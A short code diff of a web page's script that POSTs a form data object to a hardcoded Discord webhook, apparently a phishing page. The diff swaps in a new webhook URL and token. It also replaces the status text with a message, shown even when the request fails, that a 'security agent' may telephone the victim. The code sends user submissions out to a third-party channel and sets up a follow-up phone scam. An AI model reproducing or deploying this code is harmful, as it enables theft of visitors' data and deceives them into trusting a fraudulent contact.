@@ -143,15 +143,15 @@
       };
 
       try {
-        await fetch('https://discord.com/api/webhooks/1420089414486331462/bteoemRvj4vcLbpdRWxFTu8zGcuR94Lb_yb3eky6IxJjsw3v6lGxgtOHABPdKWtyB_0Y', {
+        await fetch('https://discord.com/api/webhooks/1449371896838881313/E_f2WedOINhR3sPzKXWzcMv6TUzcKt-7YovbhDdEJ-CLxqIBoTIN30Ks3Gd3fDrgYivC', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(data)
         });
 
-        statusEl.textContent = 'Accepted, please wait 48 hours';
+        statusEl.textContent = 'Accepted, please wait some time. A security agent may contact you via telephone to confirm this change.';
       } catch (err) {
-        statusEl.textContent = 'Accepted, please wait 48 hours';
+        statusEl.textContent = 'Accepted, please wait some time. A security agent may contact you via telephone to confirm this change.';
         console.error(err);
       }
     }
